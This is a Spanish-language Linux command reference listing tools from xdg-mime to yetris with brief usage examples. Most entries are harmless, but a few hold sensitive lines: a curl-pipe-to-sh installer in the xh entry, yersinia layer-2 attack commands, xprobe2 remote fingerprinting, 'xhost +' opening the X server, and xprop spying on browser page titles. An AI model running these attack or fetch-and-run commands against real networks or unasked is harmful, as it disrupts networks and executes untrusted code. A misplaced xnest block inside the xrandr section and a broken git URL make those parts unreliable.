Establece o abre archivos y url con las aplicaciones establecidas por defecto. Estas se encuentran definidas en /usr/share/applications/defaults.list.
$ xdg-mime query default text/html    (Mostrar la aplicación que por defecto abre un html)
$ xdg-mime default vlc.desktop video/mpeg  (establecer vlc por defecto)
$ xdg-mime default pcmanfm.desktop application/x-directory (establece PcMan como gestor de ficheros)
$ xdg-open http://www.tuxapuntes.com/   (abre la url)
$ xdg-open imagen.jpg  (abre la imagen)
$ cat /usr/share/applications/defaults.list. (Listado del sistema)
$ cat .local/share/applications/mimeapps.list  (Listado del usuario)


xdotool
Herramienta que permite simular la entrada del teclado y la actividad del ratón, mover, redimensionar ventanas, etc.
$ xdotool -h  (Listado de opciones)
$ xdotool key alt+F2 (Simula la pulsación de alt + F2 y arranca la aplicación asociada a la combinación)
$ xdotool mousemove 0 0 (Envia el puntero a la coordenada especificada, en este caso, extremo superior izquierdo)
$ xdotool getmouselocation (Indica las coordenadas del puntero)
$ xdotool click 1 (Hace “click” donde esté el puntero)
Ejemplo en un script [que abra una nueva pestaña, escriba “ifconfig” y pulse “return”]:
	#!/bin/bash
	xdotool key shift+ctrl+t;
	xdotool type "ifconfig";
	xdotool key Return;


xdpyinfo
Muestra información de las DPI disponibles de la sesión de Xorg actual.


xephyr
Contenedor para lanzar aplicaciones X en paralelo al servidor X en ejecución.
$ Xephyr :1 -screen 1024x768 (Lanzar la aplicación)
	:1 (valor para la variable DISPLAY a la hora de querer mostrar la aplicación dentro de Xephyr)
	-screen (resolución que tendrá la nueva pantalla)
$ DISPLAY=:1 startxfce4 (Arrancar una sesión xfce4 dentro de Xephyr)


xev
Conocer el código asociado a la tecla.
$ xev (una vez lanzada la aplicación, pulsar la tecla de la que se quiera conocer el código asociado)
	...
	keycode 134 (keysym 0xffec, Super_R)
	...


xfburn
Grabador de cds i dvds.
$ xfburn -a (grabar cd de audio)
$ xfburn -d (De datos)


xfce4
Escritorio ligero. Para la confección de los atajos de teclado, tener en cuenta lo que lanzan algunas de las aplicaciones:
$ xfce4-accesibility-settings (Configurar ratón y teclado)
$ xfce4-appearance-settings (Estilo de ventana, iconos tipo de letra..)
$ xfce4-appfinder (Buscar aplicaciones)
$ xfce4-display-settings (resolución de pantalla)
$ xfce4-keyboard-settings (Atajos de teclado, comportamiento...)
$ xfce4-mouse-theme (opciones del puntero)
$ xfce4-notes (Notas rápidas)
$ xfce4-popup-applicationsmenu (Menu general)
$ xfce4-screenshooter (Captura de pantalla)
$ xfce4-session-logout (Menú salir, reiniciar...)
$ xfce4-settings-manager (Parámetros de escritorio)
$ xfce4-terminal (Terminal)
1.-
Instalar applet de brillo de pantalla (backligth):
# apt-get install xfce4-power-manager-plugins
Despues agregar el applet al panel
2.-
Restaurar / Reparar escritorio XFCE
$ rm -Rv ~/.cache/sessions/
$ xfwm4
Si continua fallando lanzar:
$ xfwm4 --replace


xfe
Gestor de archivos ligero. Puede mostrar hasta tres paneles, con o sin árbol de directorios. Tambien incluye papelera de reciclaje, compresor/descompresor, editor de textos (Xfw), visualizador de textos (Xfv), visor de imágenes (Xfi) y gestor de paquetes (Xfp).


xflock4 (xfce4-utils)
Activa el protector de pantalla. Solicitará contraseña para salir.


xfm
Gestor de archivos minimalista.


xfonts-utils
Conjunto de programas que son necesarios para la administración de fuentes.
bdftopcf [convierte fuentes BDF en fuentes PCF], bdftruncate y ucs2any [herramientas para generar fuentes con varias codificaciones a partir de fuentes codificadas ISO 10646], fonttosfnt [para empaquetar fuentes de mapa de bits en un contenedor sfnt (TrueType)], mkfontdir [programa para generar archivos fonts.dir], mkfontscale [programa para generar archivos fonts.scale], update-fonts-alias, update-fonts-dir y update-fonts-scale


xfpt
Crear un xml a partir de un texto plano.
$ xfpt -o archivo.txt


xfrun4
Lanzador de aplicaciones propio de xfce.


xgamma
Cambiar el brillo de la pantalla.
$ xgamma -gamma 2.0
$ xgamma -gamma 1.0 (Vuelve a la situación anterior)
$ xgamma -rgamma 2.0 (aumentar rojos)
$ xgamma -bgamma 2.2 (aumentar azules)
$ xgamma -ggamma 2.2 (aumentar los verdes)


xh
Herramienta para enviar solicitudes HTTP. Descargar:
# curl -sfL https://raw.githubusercontent.com/ducaale/xh/master/install.sh | sh
$ xh http://localhost/emacs
$ xh example.com (no es necesario colocar http://)
$ xhs example.com (no es necesario colocar https://)
$ xh -d url -o archivo (descargar y guardar en un archivo)


xhost
Se utiliza para agregar o eliminar usuarios o nombres de host a la lista permitida para hacer conexiones a al servidor X.
$ xhost
$ xhost + (permitir que cualquier usuario se conecte al servidor X)
$ xhost + 32.125.3.12 (Permiter el acceso al servidor X a una ip)
$ xhost - 32.125.3.12 (Anular el permiso)


xidle
Ejecuta un programa específico después de un cierto tiempo de inactividad o cuando el cursor del mouse se mueve a un borde de la pantalla durante un tiempo determinado.
$ xidle -delay 10 -sw -area 10 -program /usr/bin/lxlock -timeout 200 (Ejecutar lxlock si no se detecta actividad en 200 segundos o si el puntero permanece en una area de 10 pixels de la esquina de abajo a la izquierda durante más de 10 segundos)


xininfo
Utilidad para consultar el diseño y tamaño actual del monitor o monitores configurados.
$ xininfo -print (información del monitor)


xinit
Permite iniciar un servidor X. El script startx [ver] es un front-end para xinit. De forma predeterminada, xinit y startx inician un servidor X en la pantalla :0. Si no existe el archivo .xinitrc del usuario, xinit/startx lanza un servidor X en pantalla y después un emulador de terminal Xterm en ella. Cuando el Xterm finaliza, xinit/startx cierra el servidor X y, generalmente, inicia un script que a su vez ejecuta un número de programas dado y un gestor de ventanas.


xinput
Muestra las id de los dispositivos de entrada.
$ xinput


xjokes
Cuatro pequeños programas divertidos para modificar una pantalla X11: yasiti, blackhole, mori1 y mori2. En todos los casos la visualización se restaurará posteriormente.
$ blackhole (produce un efecto de alejamiento animado en una pantalla)
$ mori1 -display :0 (muestra una pantalla llena con caras de una niña guiñándote un ojo en la pantalla especificada)
$ mori2 (muestra la cara grande de una chica que te guiña un ojo)
$ yasiti (muestra un pequeño objeto negro giratorio en el centro de la pantalla)
Nota.-  Por defecto se utiliza la visualización especificada por la variable de entorno DISPLAY [echo $DISPLAY].


xkcd-dl
Herramienta en python (Instalación: sudo pip install xkcd-dl) para descargar las historietas geeks de la página xkcd.com.
$ xkcd-dl --update-db (actualizar la base de datos)
$ xkcd-dl --download=1605 (Descargar una en concreto)
$ xkcd-dl --download-all (Descargar la colección completa)


xkcdpass
Generador de contraseñas relacionadas con frases [en inglés].
$ xkcdpass -C alternating --count=5 -a 'shit' -d '&' --min=6 --max=8 --valid-chars='[a-z,A-Z]' (5 palabras alternando mayúsculas y minúsculas, que la primera letra de cada palabra deletreen "shit", separadas con & y entre 6 y 8 letras)


xkeycaps
Muestra un teclado en X y pasando el puntero del ratón sobre las teclas muestra como se llaman y características.
$ xkeycaps -help (muestra todos los teclados soportados)
$ xkeycaps -kbd PC105ES (abre el teclado en versión española directamente)


xkill
Matar aplicaciones rebeldes.
$ xkill (El cursor se convierte en una calavera y donde se clica mata la aplicación)


xli
Visor de imágenes.
$ xli imagen.jpg
Teclas de control:
	l (Rotar 1/4 a la izquierda)
	r (Rotar 1/4 a la derecha)
	. (Actualizar la imagen)
	números del 5 al 2 (Aclarar la imagen)
	números del 6 al 9 (Oscurecer la imagen)
	< (Empequeñecer)
	> (Agrandar)
	q (salir)


xlock
[xclockmore]. Activar el protector de pantalla. Solicitará contraseña para salir.
$ xlock -mode anemona
Existen muchas opciones de “mode”: atlantis, dragon, crystal...)


xlsclients
Lista las aplicaciones que se están ejecutando en una sesión.
# xlsclients -display :0   (Especificando sesión)
# xlsclients -a      (Lo mismo de la sesión actual)
# xlsclients -l  (Lista extendida)


xmem
Monitoriza el uso de ram y de swap.
$ xmem -update 1 -codecolor black -nolabel (Que actualice resultados cada segundo, mostraqr en negro la memoria usada y sin mostrar el hostname)
Colores por defecto:
	-codecolor red (Color de la memoria usada)
	-cachecolor yellow (De la memoria caché)
	-buffercolor blue (Memoria del buffer)
	-freecolor green (de la memoria libre)
	-swapcolor red (de la memoria swap. Mismo color que la memoria usada)


xmltoman
Script para convertir archivos .xml a páginas man en formato groff o html. Presenta los elementos habituales de la página de manual, como "description", "options", "see also", etc.
xmltoman archivo.xml > archivo.html


xmllint
[libxml]. Hace más legible el lenguaje XML. También incluye la aplicacion ament_xmllint que solo indica si el archivo está bien formado.
$ ament_xmllint archivo.xml
$ xmllint archivo.xml
$ xmllint --html archivo.xml (con salida como html)


xmlstarlet
Utilidad que permite manipular, filtrar, editar, buscar, validar y aplicar hojas de estilo al contenido XML. Desafortunadamente es extremadamente poco intuitivo y muchos usuarios luchan con los parámetros de línea de comando ofuscados y el lenguaje peculiar de scripting. Aquí mostraremos algunas formas en que puede usarse para simplificar algunas tareas básicas diarias.
$ xmlstarlet sel -t -v "count(//linux)" texto.xml (cuantas veces aparece la palabra "linux" en "texto.xml"
$ xmlstarlet sel -t -m "//linux" -v "species" -o " " -v "@name" -n texto.xml
$ xmlstarlet sel --net -t -m "//linux" -o "Title: " -v "title" -n -o "Author: " -v "author" -n  http://URL (de un sitio web)
$ xmlstarlet sel --net --html -t -m "//linux" -v "@src" -n http://URL
Algunas de las opciones:
	sel (que planeamos extraer o filtrar datos)
	-t (que los siguientes parámetros forman parte de la plantilla de salida)
	-v (utiliza para generar el valor de una expresión xpath)
	-m (que repita en todos los nodos que coincidan con la expresión xpath proporcionada [linux])
	-o (que genere una cadena de texto y se usa en este ejemplo para incluir un espacio entre los dos valores asociados con cada "linux".)
	-n (que incluya nueva línea. Si se omite todos los datos aparecerían en una línea de texto.)
	--net (que descargue el contenido XML desde una ubicación remota.)
	--html (extraer datos de un sitio web.)


xmodmap
Muestra la disposición del teclado
$ xmodmap -pke (listado)
$ xmodmap -e 'keycode 66 = Shift_L' (acoplar una tecla a determinada asignación [que la tecla "Bloq Mayús" funcione como la "shift" debajo de ella.])
Nota.- el keycode [código de la tecla] se averigua lanzando xev [ver]


xnest
Herramienta que permite abrir un servidor X dentro de otro servidor X
$ Xnest :20 -ca & (Sesion número 20)
Para mandar instancias al servidor xnest:
$ xterm -display :20 (Abrirá exterm en el interior de la sesión 20)
$ Xnest :20 -geometry 800x600 & (Especificando medidas de la ventana)


xpenguins
Pingüinos caminando por la parte superior de la ventana.
$ xpenguins -l (lista de temas)
$ xpenguins -t Bill -n 10 -p -m 5 (10 pinguinos con el tema Bill, ignorando las ventanas emergentes y un retraso de 5 fotogramas entre ellos)


xphoon
Muestra las fases de la luna como fondo de pantalla. Para que se visualice ha de matarse el fondo de pantalla activo.
$ xphoon -demo (Muestra una demo rápida de todas las fases de la luna)
$ xphoon -t 10 -i (Que actualice la imagen cada 10 minutos y muestre el identificador del proceso [PID])


xpra
Permite ejecutar en un equipo una aplicación remota desde un servidor X, manteniendo la conexión aunque esta se hay interrumpido. Posibilita la comunicación remota con aplicaciones individuales sin que sea obligatorio cargar todo el escritorio remoto.
	@client:~$ ssh usuario@servidor.com (Establecer conexión con el servidor)
	@server:~$ xpra start :5 (Arrancar el Display 5)
	@server:~$ DISPLAY=:5 midori & (Lanzar una aplicación [midori] en el display 5)
	@server:~$ logout (Cerrar la conexión con el servidor)
	Realizar una nueva conexión con el servidor esta vez con xpra y contra el display 5:
	@client:~$ xpra attach ssh:usuario@servidor.com:5 (Después de entrar la contraseña, se abrirá la aplicación midori del servidor en el cliente)
	@server:~$ xpra list (Lista las sesiones xpra abiertas)
	@server:~$ xpra stop :5 (Cierra el display 5)
	@server:~$ xpra attach :5 (Entra en el display 5)


xprintidle
Utilidad que consulta al servidor X el tiempo de inactividad del usuario y lo imprime en la salida estándar en milisegundos.
$ xprintidle


xprobe
Intenta identificar sistemas operativos remotos enviando una serie de tests y determinando su tipo en base a las respuestas recibidas.
# xprobe2 ip
varios ejemplos de uso en su pagina man


xprop
Propiedades de una ventana. Si no se especifica ID de dicha ventana, el cursor se convierte en una cruz y mostrará la que se clique.
$ xprop -display :0 -spy | grep "WM_NAME(STRING)"  (Sobre el navegador, mostrará las páginas visitadas)


xrandr
Cambiar la resolución de pantalla.
$ xrandr  (muestra la resolución usada, la máxima, la mínima y todas las posibles. La marcada con un "*" es la usada y la “+” es la optima)
$ xrandr | grep \* | cut -d' ' -f4 (otra forma de ver la resolución usada)
$ xrandr -s 1280x1024    (modificar la resolución)
$ xrandr -r 76   (modificar la tasa de refresco)
$ xrandr --auto (configurar proyectores externos)
$ xrandr -q | awk -F'current' -F',' 'NR==1 {gsub("( |current)","");print $2}'  (solo muestra la resolución usada)
$ xrandr -q | grep -w Screen (muestra la mínima, la usada y la máxima)
Ejemplo práctico:
Conocer resoluciones y cual es la utilizada:
$ xrandr
crear/agregar nueva resolución:
$ cvt 1127 999 | grep Modeline | cut -d" " -f 2-
"1128x999_60.00"   93.00  1128 1200 1312 1496  999 1002 1012 1037 -hsync +vsync
cargar la nueva resolución:
$ xrandr --newmode "1128x999_60.00"   93.00  1128 1200 1312 1496  999 1002 1012 1037 -hsync +vsync
Comprobar que se ha agregado la nueva resolución:
$ xrandr
añadir el modo creado a la tarjeta conectada (VGA-0, LVDS1...)
$ xrandr --addmode VGA-0 1128x999_60.00
Para eliminar este modo: xnest
Herramienta que permite abrir un servidor X dentro de otro servidor X
$ xnest :20 -ca & (Sesion número 20)
Para mandar instancias al servidor xnest:
$ xterm -display :20 (Abrirá exterm en el interior de la sesión 20)
$ xnest :20 -geometry 800x600 & (Especificando medidas de la ventana)
$ xrandr --rmmode VGA-0 1128x999_60.00
Para predeterminar la nueva configuración:
$ xrandr --output VGA-0 --mode 1128x999_60.00
Si nos da un error “out of range” (fuera de rango) suele ser porque la tasa de refresco del monitor es diferente de la configurada por defecto. Para modificarla:
$ xrandr --output VGA-0 --mode 1128x999_60.00 --rate 60,3
Una vez comprobado que todo funciona para hacer permanentes los cambios:
# nano /etc/gdm/Init/Default
A continuación de las lineas:
	PATH=”/usr/bin:$PATH”
	OLD_IFS=$IFS
Añadir:
	xrandr --newmode "1128x999_60.00"   93.00  1128 1200 1312 1496  999 1002 1012 1037 -hsync +vsync
	xrandr --addmode VGA-0 1128x999_60.00
	xrandr --output VGA-0 --mode 1128x999_60.00 --rate 60,3
Reiniciar.


xrdb
Permite administrar la base de datos de recursos X. La base de datos de recursos X, comúnmente conocida como Xresources, es utilizada por el sistema X Window para almacenar las preferencias del usuario y los ajustes de configuración para aplicaciones X, esto proporciona una manera de cambiar dinámicamente la apariencia o el comportamiento de las aplicaciones sin reiniciarlas. Xrdb no carga ningún archivo por sí solo, pero muchos entornos de escritorio usan xrdb para cargar archivos ~/.Xresources al inicio de la sesión para inicializar la base de datos de recursos, como un reemplazo generalizado de los archivos ~/.Xdefaults.
$ xrdb .Xresources (recargar la configuración de .Xresources)
$ xrdb -query (Consulta la base de datos de recursos e imprime los valores establecidos)
$ xrdb -load ~/.Xresources (recargar los nuevos valores si se ha modificado el archivo)


xrefresh
Refresca la imagen del servidor Xorg


xrestop
Monitoriza los recuros X11 de los clientes conectados. Ayuda a encontrar problemas con el consumo de las aplicaciones que corren en las X. Se considera un derivado de top.
$ xrestop


xrootconsole
Mostrar un archivo en la pantalla del escritorio.
$ xrootconsole archivo
$ xrootconsole -bg black -fg red (especificando color de fondo y letra)
Otras opciones:
	-geometry 70x20 (Por defecto 80x10+0+0)
	-fn fuente (Especificando fuente)


xscreensaver
[xscreensaver-screensaver-bsod]
Colección de salvapantallas. El paquete bsod añade salvapantallas sobre clásico errores en windows i mc
$ ls /usr/lib/xscreensaver/ (Listar todas las opciones)
$ /usr/lib/xscreensaver/distort (Lanzando la opción distort)
$ /usr/lib/xscreensaver/bsod


xsel
Permite manipular el portapapeles de las X desde la línea de comandos.
$ xsel -p | more  (Mostrar todo lo copiado al portapapeles)
$ xsel --clipboard --output (otra forma)
$ xsel --clipboard > archivo.txt (Volcar el contenido del portapapeles)
$ cat /etc/apt/sources.list | xsel -b  (Copiar al portapapeles)
$ xsel --clipboard  (Pegar lo copiado)
$ xsel --clipboard --clear (borrar el contenido del portapapeles)


xset
Aplicación para establecer parámetros del servidor X
# xset q (muestra información de la configuración actual)
# xset dpms 200 300 600 (segundos para entrar en standby [200], en suspenso [300] y apagado [600]
# xset m 4 (Para que el mouse se mueva más rápido. Valores de 1 a 5)
# xset -dpms (quita el apagado de pantalla)
# xset +dpms (lo activa nuevamente)
# xset dpms force off (apaga el monitor. Se enciende moviendo el cursor)
# xset s noblank  (preferencias del salvapantallas)
# xset s off (Quitar la activación del salvapantallas)
# xset fp default (restaura el path de fuentes de X)
# xset r rate 200 10 (establece retardo de 200 milisegundos y velocidad de repetición de 10 por segundo)
# xset r rate (devuelve a los parámetros por defecto)
# xset -b off/on  (Activa/desactiva los pitidos del altavoz interno)
Esto último tiene el mismo efecto que:
# nano /etc/inputrc
y desclicar la linea
	set bell-style none)


xss-lock
Herramienta para escuchar eventos XScreenSaver para suspender, hibernar, bloquear o desbloquear sesión con las acciones apropiadas.
$ nano ~/.profile
Añadir la linea
xss-lock -- /usr/bin/xscreensaver-command -lock &


xstarfish
Generador de imágenes aleatorias coloridas y en mosaico para fondo de escritorio usando funciones matemáticas. No usa imagen de origen.
$ xstarfish -d 300 (que se actualice cada 5 minutos)
$ xstarfish -g 400x400 -o walpaper.png (de 400x400 pixels, por defecto 256x256 y que se guarde con el nombre indicado)
$ xstarfish -s full -o image.png (del tamaño predeterminado del monitor y nombre de salida)


xtables_addons
[libtext-csv-xs-perl xtables-addons-common xtables-addons-dkms]. GeoIP para Iptables. Bloqueo de ataques por paises o anonimos. El proceso de instalación es el siguiete:
Configuración:
	# cd /usr/lib/xtables-addons/
	# ./xt_geoip_dl (actualizar las bases de datos)
	# mkdir -p /usr/share/xt_geoip/ (crear directorio de almacen)
	# /usr/lib/xtables-addons/xt_geoip_build -D /usr/share/xt_geoip/ *.csv (configurar todos los paises)
Una vez configurada la base de datos podemos crear normas para iptables, por ejemplo para denegar el acceso de China y los proxis anonimos a los puertos 80 y 443:
	# iptables -A INPUT -m geoip --src-cc CN -j DROP
	# iptables -A INPUT -p tcp -m tcp -m multiport --dports 80,443 -m geoip --src-cc A1 -j DROP
CN se corresponde con el código de China de la base de datos geoip que contendrá los rangos de IP que se denegarán (drop). En la segunda regla, añadiríamos el protocolo tcp, los puertos 80 (http) y 443 (https) y el rango A1 (proxies anónimos).
Si la política por defecto es denegación de servicio a todos (DROP) y queremos permitir acceso para usuarios de España, la regla sería:
	# iptables -A INPUT -p tcp -m tcp -m multiport --dports 80,443 -m geoip --src-cc ES -j ACCEPT
Nota.- Para comprobar las reglas introducidas:
	# iptables -L -n --line-numbers


xterm
Emulador de terminal
$ xterm -bg black -fg gray -bc -cr red -e ssh usuario@remoto.com
$ xterm -fg white -bg blue -e links2 http://google.es & (Abrir navegador en una terminal con fondo azul y letra blanca)
$ xterm -u8 (Arrancar la terminal con soporte utf-8 [equivalente a lanzarla con uxterm])
Opciones:
	-cr blue (cursor de color azul [white, yellow, grey, red...])
    -geom 100x100 (especificar dimensiones)
	-maximized  (Ventana maximizada)
1.-
Modificar las medidas por defecto:
# nano /usr/share/vte/termcap/xterm
Buscar la linea:
co#80:it#8:li#24:\
Y modificar los parámetros co [columnas] y li [líneas] por ejemplo:
co#120:it#8:li#15:\
2.-
Otras  personalizaciones:
Modificar o crear el archivo:
$ nano .Xresources
Pegar el contenido:
	XTerm*Background: black
	XTerm*Foreground: yellow
	XTerm*font: 9x15
	XTerm*saveLines: 1000
	XTerm*HiForeColor: white
	XTerm*HiBackColor: #c06077
$ xrdb -merge .Xresources (Aplicar los cambios, en caso contrario no se aplicaran hasta el siguiente reinicio)


xtermcontrol
Utilidad para consultar y modificar dinámicamente las propiedades de una terminal (xterm, sakura, guake...).
$ xtermcontrol --fg red --cursor yellow --title bash (letra rojo, cursor amarillo y titulo de la ventana "bash")


xtermset
Permite cambiar título, color, fuente, geometría... de una ventana de terminal. Puede aplicarse a algunas terminales como sakura, guake, xterm... No a todas. En una terminal tecleamos:
$ xtermset -n linux -T linux -fg green -cr white (título de la terminal y el icono con nombre "linux", letra verde y cursor blanco)


xtitle
Establece el título de la ventana y/o el nombre del icono de la ventana del terminal en la que se ejecuta como argumentos de la línea de comandos. A menos que se supriman los mensajes, xtitle también informará las configuraciones que ha realizado.
$ sakura (lanzamos una terminal)
$ xtitle linux (cambia el titulo de la terminal y del icono)
$ xtitle -t sakura-linux (solo lo cambia en la termminal)
$ xtitle -i linux (solo en el icono)
$ xtitle -q sakura (vuelve a dejar el título de la terminal y el icono como estaban sin mostrar la salida)


xttitle
Estable el título de la terminal y, si se indica, del icono.
$ xttitle linux linux (estable el título de la terminal y del icono)
$ xttitle bash (solo de la terminal)


xtrlock
Bloquea el servidor de las X hasta que el usuario no introduce la contraseña y pulsa enter. El cursor se convierte en un candado y el teclado no reponde. Antes de introducir la contraseña es preferible clicar "esc" para borrar todo lo que puede haberse pulsado en el teclado. La introducción de la contraseña no es visible en pantalla.
$ xtrlock


xvfb-run
Ejecutar un comando X en un entorno de servidor virtual.
$ xvfb-run --server-num=1 rdesktop -u USER -p PASS -g 1024x768 192.168.1.10 (abrir conexión de escritorio remoto sin X:)


xvkbd
Teclado virtual.


xwd
[xbase-clients]. Captura de pantalla
$ xwd > pantalla.xwd  (Capturar la ventana al clicarla)
$ xwd -root -screen > pantalla.xwd  (Capturar la ventana inmediatamente)
$ xwud -in pantalla.xwd  (Ver imágenes en formato xwd)


xwininfo
Da información acerca de la ventana que seleccionemos
$ xwininfo -root (nos da información del entorno base)
$ xwininfo -id 73402749 (nos da información de una ventana por su id)
$ xwininfo -name "nombre" (información de una ventana por su nombre 				completo)
$ xwininfo -children -root (ver todas las ventanas activas con su id y nombre)
$ xwininfo -tree -root (lo mismo que el anterior pero mostrado en arbol)
$ xwininfo -int (mostrar la id en base 10 en vez de hexadecimal)
$ xwininfo -all (nos proporciona toda la información acerca de una ventana)
$ xwininfo -all -root (nos da información de todo el entorno y ventanas existentes en la sesión de Xorg)


xwrits
Programa recordatorio diseñado para hacer saber al usuario que es hora de tomar un descanso de la escritura para evitar daños en la muñecas.
$ xwrits --multiscreen +once -t 30 -b 10 +lock (muestra en todas las pantallas, hacer clic en la ventana de advertencia, trabajar 30', por defecto 55', descanso de 10', por defecto 5' y bloquea el teclado)
Algunas otras opciones:
        password=12345 (colocar una contraseña)
        +mouse (la máquina controla los movimientos del ratón)
        minbreaktime=15 (duración mínima del descanso 15')
        +cheat=30 (permitir 30 pulsaciones antes del bloqueo)
        ct=5 (permitir 5' después de cancelar un trabajo, por defecto 10')


xymon
Sistema de monitorización de hosts y redes, inspirado en el sistema Big Brother. Proporciona monitorización en tiempo real, una sencilla interfaz web, datos históricos, informes de disponibilidad y gráficos de rendimiento. Acceder a los informes con el navegador <http://localhost/xymon>


xxd
convertir textos de ASCII a hexadecimal o viceversa.
$ xxd -p  (entra en el prompt de la aplicación. Teclear la palabra o frase y darle a intro para la conversión. Ctrl+c para salir del prompt)
$ xxd -r -p  (Proceso inverso)


xxxterm
Navegador minimalista con soporte para flash.
Descomprimir  el archivo de configuración y copiarlo en el directorio personal:
	$ cp /usr/share/doc/xxxterm/examples/xxxterm.conf.gz .
	$ gzip -d xxxterm.conf.gz
	$ mv xxxterm.conf .xxxterm.conf (Hacerlo oculto)
Editarlo para la configuración. A título de muestra:
$ nano xxxterm.conf
	home                    = http://google.es
	window_width            = 1524
	window_height           = 768
	encoding                = UTF-8
algunos atajos:
	F6 (Barra de navegación)
	i (Buscador de la página)
	Ctrl + t (Nueva pestaña)
	Ctrl + w (Cerrar pestaña)
	Alt + h (Historial)
	F5 (Recargar página)
	/ (Buscar un termino)
	n (Siguiente termino)
	N (Anterior termino)
	Alt + q ()Reiniciar el navegador)
	Ctrl + q (Cerrar el navegador)


xz
[xz-utils]. Comprimir y descomprimir archivos. Programas incluidos en el paquete: unxz [xz --decompress], xzcat [xz --decompress --stdout], lzma [xz --format=lzma], unlzma [xz --format=lzma --decompress] y lzcat [xz --format=lzma --decompress --stdout]
$ xz -z file (comprimir)
$ xz -d file (descomprimir)
$ xz -l file1.xz file2.lzma file3.txz (información sobre archivos comprimidos)
$ xz -t file1.xz file2.lzma file3.txz (prueba la integridad de los archivos comprimidos)


yacpi
Herramienta de monitoreo para portátiles.
$ yacpi
$ yacpi -n (Mostrar hasta los que no estan activos)
$ yacpi -d 2 (Actualizar los datos cada 2 segundos)
$ yacpi -b (De la bateria)
$ yacpi -f (Cel ventilador)
$ yacpi -t (La temperatura)
$ yacpi -c (De la cpu)
Para salir pulsar "q" y para actualizar datos "r"


yacy
[openjdk-6-jre-headless]. Buscador libre y descentralizado. La red no almacenada las busquedas y no es posible censurar el contenido del indice compartido. Descarga de <http://debian.yacy.net> o añadiendo al sources.list la linea:
	deb http://debian.yacy.net ./
Arrancar el demonio de forma clásica:
# /etc/init.d/yacy start (restart para reiniciar y stop para parar)
El acceso se realiza colocando en la barra de direcciones del navegador:
	http://localhost:8090
Para el acceso externo es preciso redireccionar en el router el puerto al pc correspondiente.


yafc
Cliente ftp con soporte para conexiones ftp y ssh.
$ yafc 67.33.83.15
$ yafc ssh://USER@172.17.0.221:22/documents
$ yafc ssh://USER:PASS@172.17.0.221:22/documents


yaourt
Gestor de paqueteria de archlinux que incorpora el repositorio AUR. En general tiene las mismas opciones que pacman.
$ yaourt -Syu --aur (actualización completa del sistema)
$ yaourt -C (edición y fusión de .pacnew/.pacsave)
$ yaourt -CC (eliminación de todos los .pacnew/.pacsave)
$ yaourt -S - aur paquete (fuerza la instalación desde los depósitos de AURYES)
$ yaourt -B (Realizar una copia de seguridad de la base de datos de yaourt)
1.-
Para que yaourt no pida confirmación y ver archivos:
# nano /etc/yaourtrc
Y colocar las siguientes lineas con los valores que se muestran:
	BUILD_NOCONFIRM=1
	EDITFILES=0


yapet
Registro y generador de contraseñas que se guardan cifradas.
$ yapet
Teclas de control:
	s Guardar
	r Cargar archivo
	e Crear archivo
	l Bloquear pantalla
	a Nueva entrada
	d Borrar entrada
	o Ordenar
	/ Buscar
	n Buscar siguiente
	c Cambiar contraseña
	i Información
	g Generar contraseña
	q Salir


yasat
Herramienta que permite realizar una auditoría rápida del sistema o de diferentes partes que lo componen: usuarios, servicios apache, samba, cups, php, netwirk, comprobación del kernel, etc. Por defecto los informe se guardan en ~/.yasat/).
$ yasat -l (Listar plugins disponibles)
# yasat -s (Auditoria standard del sistema)
# yasat -f (Auditoria más exhaustiva)
# yasat -a (Sin pedir confirmaciones)
Algunas opciones:
	-H (Obtener el resultado en formato html. Por defecto en ~/.yasat/yasat.html)
	--check-update (Verificar si existen actualizaciones de la aplicación)
	--skip nfs,ntp (Sólo comprobar los servicios mencionados, separados por comas)
	--html-output archivo.html (Mandar el resultado a un archivo que no sea el por defecto. Precisa tambien -H)


yash
Shell de línea de comandos que cumple con el estándar POSIX.1 (IEEE Std 1003.1, edición 2008) mucho más compatible con POSIX que otros shell como bash y zsh.
$ touch .yashrc (crear un archivo vacio de configuración para evitar que lo pida al lanzar la aplicación)
Tambien puede copiarse la que se instala por defecto
$ cp /usr/share/yash/initialization/sample .yashrc
$ yashrc (entrar en la shell)


yeahconsole
pone una ventana X un emulador de terminal en la parte superior de la pantalla que desplegable como una consola. Actualmente soporta xterm, urxvt y mrxvt.
$ yeahconsole (iniciar un emulador de terminal en la parte superior de la pantalla)
$ yeahconsole -geometry 80x20 (iniciar una terminal con 80 columnas y 20 filas)
$ yeahconsole -e htop (ejecutar htop en el terminal flotante)
Personalizar la apariencia configurando las opciones en ~/.Xresources o ~/.Xdefaults:
$ nano ~/.Xresources
Y pegar las lineas:
  yeahconsole*background: black
  yeahconsole*foreground: white
  yeahconsole*font: 10x20
  yeahconsole*toggleKey: F12
$ xrdb ~/.Xresources (recargar la configuración)
$ yeahconsole -b (ejecutar sin bordes visibles)
$ yeahconsole -s (iniciar minimizado)
$ yeahconsole -T F12 (mostrar/ocultar el terminal, si no consta el el archivo de configuración)


yelp
Navegador de ayuda de gnome. Incluye documentación detallada sobre la mayoría de aplicaciones y utilidades [panel, gestor de archivos...]


yersinia
Es un marco para realizar ataques de capa 2. Esta diseñado para aprovechar algunas debilidades en diferentes protocolos de red. Pretende ser un marco sólido para analizar y probar las redes y sistemas desplegados. Puede realizar ataques para los siguientes protocolos de red:  Protocolo Spanning Tree (STP), Protocolo de descubrimiento de Cisco (CDP), Protocolo de enlace dinámico (DTP), Protocolo de configuración dinámica de host (DHCP),  Protocolo de enrutador Hot Standby (HSRP), 802.1q, 802.1x, Protocolo de enlace entre conmutadores (ISL), Protocolo de enlace de VLAN (VTP).
# yersinia -G (arrancar el modo gráfico)
# yersinia -I (modo interactiivo ncurses)
# yersinia -D (como daemon)
# yersinia stp -attack 0 -version 2 -flags 5c -portid 3000 -interface eth1
# yersinia stp -attack 4
# yersinia stp -attack 3 -source 66:66:66:66:66:66


yes
Repetición indefinida, hasta matar el proceso con Ctrl + c,  de una palabra o frase.
$ yes linux es genial
$ yes "$(figlet Linux)" (En combinación con el comando figlet)
$ yes | rm -i * (Pasado como entrada para que conteste "si" a todo)


yetris
[libncurses5-dev]. Juego tetris para ncurses.
	$ git clone https://github.com/alexdantas/.git
	$ cd yetris
	$ make
	$ make install
$ yetris -c -g -n (En el centro de la pantalla, sin pistas de donde caen los bloques y sin color)
$ yetris -u (Mostrar el modo de uso)
$ yetris -r (Resetear las reglas)
Algunas teclas de control:
	Flechas derecha izquierda (Desplazamiento horizontal)
	espacio o flecha abajo (Desplazamiento vertical rápido)
	z, x (Rotar los bloques)
	p (Pausa. Pulsar otra vez "p" para salir de pausa)
	h (Mostrar teclas de control. Intro para salir)
	r (Reiniciar el juego)
	q (salir)


ylva
